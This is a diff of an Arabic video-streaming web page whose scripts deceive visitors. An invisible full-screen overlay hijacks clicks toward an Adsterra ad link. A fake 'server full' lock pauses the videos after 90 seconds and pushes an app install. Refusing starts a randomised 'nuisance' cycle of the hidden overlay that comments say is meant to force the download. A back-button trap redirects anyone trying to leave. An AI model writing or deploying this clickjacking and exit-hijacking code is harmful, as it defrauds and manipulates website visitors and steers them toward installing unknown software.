@@ -12,26 +12,35 @@
     <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ4Kkg5XxjScF4trb9wRltxd8HkeZomB0iz0ZzGvi2Qb0L1Kv_6GA1enwedbGuCtTfPQLh4xnVIcZzEUyI2Dg4Iqmfh3DMYvI_UOfZUwlqH4Bw78T-nJvT0lelEhqMjQ9KBgO8I-fZLb-tECSQfR0oQfaAu78GOD1Du9glfFS7aFDtXP9cmPQTuklADFjL/s982/1000204257.jpg" name="twitter:image"></meta>
 
     <style>
-        body { background-color: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; text-align: center; overflow-x: hidden; }
+        :root {
+            --accent: #ff0000;
+            --secondary: #ffcc00;
+            --bg: #000;
+        }
+
+        body { background-color: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; text-align: center; overflow-x: hidden; }
         
-        /* ستارة Adsterra الشفافة */
+        /* ستارة Adsterra الشفافة للتحفيز العكسي */
         #invisible-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; display: none; }
         
-        /* قفل السيرفر الاحترافي */
+        /* قفل السيرفر المتطور */
         #app-lock-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.97); z-index: 10001; display: none; align-items: center; justify-content: center; backdrop-filter: blur(20px); }
         
         .lock-card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; max-width: 85%; box-shadow: 0 0 50px rgba(255, 0, 0, 0.4); }
         .main-container { max-width: 650px; margin: auto; padding: 10px; }
         header { padding: 15px; border-bottom: 1px solid #222; margin-bottom: 15px; }
-        .logo { font-size: 1.8rem; font-weight: 900; color: #ff0000; text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
+        .logo { font-size: 1.8rem; font-weight: 900; color: var(--accent); text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
+        
         .video-card { background: #111; border-radius: 12px; overflow: hidden; border: 1px solid #333; margin-bottom: 25px; }
-        .video-title { padding: 10px; font-size: 0.9rem; color: #ffcc00; text-align: right; border-bottom: 1px solid #222; background: #161616; }
+        .video-title { padding: 10px; font-size: 0.9rem; color: var(--secondary); text-align: right; border-bottom: 1px solid #222; background: #161616; }
         .hero-video { aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; background: #000; }
         video { width: 100%; height: 100%; object-fit: contain; }
         
         .btn-install { background: linear-gradient(90deg, #00C853, #64DD17); color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.3rem; margin-top: 25px; animation: pulse 1.5s infinite; border: none; cursor: pointer; }
         @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.05); } 100% { transform: scale(1); } }
         .refuse-link { color: #444; font-size: 0.8rem; text-decoration: underline; margin-top: 20px; display: block; cursor: pointer; }
+
+        .status-bar { font-size: 0.75rem; color: #666; padding: 10px; border-top: 1px solid #222; margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -41,7 +50,7 @@
 <div id="app-lock-overlay">
     <div class="lock-card">
         <div style="font-size: 3rem; margin-bottom: 10px;">🛡️</div>
-        <h2 style="color: #ffcc00; margin-bottom: 15px;">عذراً: السيرفر ممتلئ!</h2>
+        <h2 style="color: var(--secondary); margin-bottom: 15px;">عذراً: السيرفر ممتلئ!</h2>
         <p style="color: #eee; font-size: 1rem; line-height: 1.6;">
             لتجنب حذف المحتوى وضمان مشاهدة سريعة بدون تقطيع، يرجى فتح الأرشيف عبر التطبيق الرسمي من المتاجر المعتمدة.
         </p>
@@ -107,38 +116,42 @@
     </div>
 </div>
 
+<div class="status-bar">
+    &copy; 2026 حصريات العرب - جميع الحقوق محفوظة
+</div>
+
 <script>
     const adsLink = "https://www.effectivegatecpm.com/am4whsry06?key=cbec04a8dfceb0dd47c7df9691777cb5";
     const overlay = document.getElementById('invisible-overlay');
     const lock = document.getElementById('app-lock-overlay');
     let refusalMode = false;
 
-    // تفعيل القفل بعد 90 ثانية بالضبط
+    // تفعيل القفل بعد 90 ثانية (التوقيت الذهبي لـ "ميرمرا")
     setTimeout(() => {
         lock.style.display = 'flex';
         document.querySelectorAll('video').forEach(v => v.pause());
     }, 90000);
 
-    // التعامل مع رفض التحميل
+    // التعامل مع رفض التحميل (بدء نظام الإزعاج)
     function handleRefusal() {
         window.open(adsLink, '_blank');
         lock.style.display = 'none';
         refusalMode = true;
-        activateNuisanceAds(); // بدء الإعلانات المستفزة
+        activateNuisanceAds();
     }
 
-    // نظام الستارة المستفزة (تحفيز عكسي للتحميل)
+    // نظام الستارة الشفافة التي تظهر وتختفي لإجبار المستخدم على التحميل
     function activateNuisanceAds() {
         function showCycle() {
             if(!refusalMode) return;
-            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000; // 3-6 ثوانٍ هدوء
-            const activeTime = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000; // 8-12 ثانية ستارة نشطة
+            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000; // هدوء 3-6 ث
+            const activeTime = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000; // إزعاج 8-12 ث
 
             setTimeout(() => {
                 overlay.style.display = 'block';
                 setTimeout(() => {
                     overlay.style.display = 'none';
-                    showCycle(); // تكرار
+                    showCycle(); 
                 }, activeTime);
             }, waitTime);
         }
@@ -150,7 +163,7 @@
         overlay.style.display = 'none';
     }
 
-    // منع الخروج الذكي
+    // منع الخروج وتحويل المستخدم للإعلان
     (function() {
         window.history.pushState({page: 1}, "", window.location.href);
         window.onpopstate = function() {
